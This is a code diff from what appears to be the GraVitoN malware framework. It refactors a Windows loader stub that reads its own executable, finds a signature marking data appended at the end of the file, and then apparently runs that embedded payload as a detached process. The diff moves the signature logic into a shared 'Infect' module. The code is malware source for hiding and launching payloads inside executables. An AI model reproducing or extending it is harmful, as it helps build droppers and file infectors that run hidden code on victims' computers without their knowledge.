@@ -5,56 +5,43 @@
 /// Activate/Deactivate GraVitoN logger
 #define GVN_ACTIVATE_LOGGER
 
-#include "../../../../gvn_utils/gvn_files.hpp"
+#include <windows.h>
+#include <utils/files.hpp>
+#include <infect/generic/endoffile.hpp>
+#include <sys/types.h>
+#include <unistd.h>
 #include <iostream>
 #include <cassert>
 #include <vector>
-#include <windows.h>
 
 using namespace std;
-using namespace GraVitoN;
+using namespace GraVitoN::Utils;
+using namespace GraVitoN::Infect;
 
 typedef unsigned long UInt64;
 
-int SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE = 256;
-unsigned char *SPREAD_ENDOFFILE_EOF_SIGNATURE;
-
-void generateSignature()
-{
-        SPREAD_ENDOFFILE_EOF_SIGNATURE = new unsigned char[SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE];
-	unsigned char sig = 0xCE;
-        for(int i=0; i<SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE; ++i)
-	{
-		//printf("%.2x\n", sig);
-                SPREAD_ENDOFFILE_EOF_SIGNATURE[i] = sig;
-		
-		/// 79 is a prime number!
-		sig = (~sig % 79 + (sig << 8) % 79 + (sig >> 8) % 79) % 0xFF;
-	}
-}
-
 UInt64 getSignaturePos(const char unsigned *buff, const UInt64 &size)
 {
-	UInt64 spos = 0, i = 0;
-	for(i=0; i<size; ++i)
-	{
-                if( buff[i] == SPREAD_ENDOFFILE_EOF_SIGNATURE[spos] )
-		{
-			++spos;
-			Logger::logItLn(spos);
-                        if( spos == SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE )
-			{
-				Logger::logItLn(i);	
-                                return i - SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE;
-			}
-		}
-		else
-		{
-			spos = 0;
-		}
-	}
-	
-	return size;
+    size_t spos = 0, i = 0;
+    for(i=0; i<size; ++i)
+    {
+        if( buff[i] == EndOfFile::ENDOFFILE_EOF_SIGNATURE[spos] )
+        {
+            ++spos;
+            //Logger::logItLn(spos);
+            if( spos == EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE )
+            {
+                //Logger::logItLn(i);
+                return i - EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE;
+            }
+        }
+        else
+        {
+            spos = 0;
+        }
+    }
+
+    return size;
 }
 
 void runDetachedProcess(const string &exe_path)
@@ -93,7 +80,7 @@ int WINAPI WinMain (HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR cmd_l
 	buff_size = File::loadFile(myExeName, &buff);
 	//buff_size = File::loadFile("payload.exe", &buff);
 	
-        spos = getSignaturePos(buff, buff_size) + SPREAD_ENDOFFILE_EOF_SIGNATURE_SIZE + 1;
+    spos = getSignaturePos(buff, buff_size) + EndOfFile::ENDOFFILE_EOF_SIGNATURE_SIZE + 1;
 	//printf("%lu < %lu\n", spos, buff_size);
 	assert(spos < buff_size);
 	
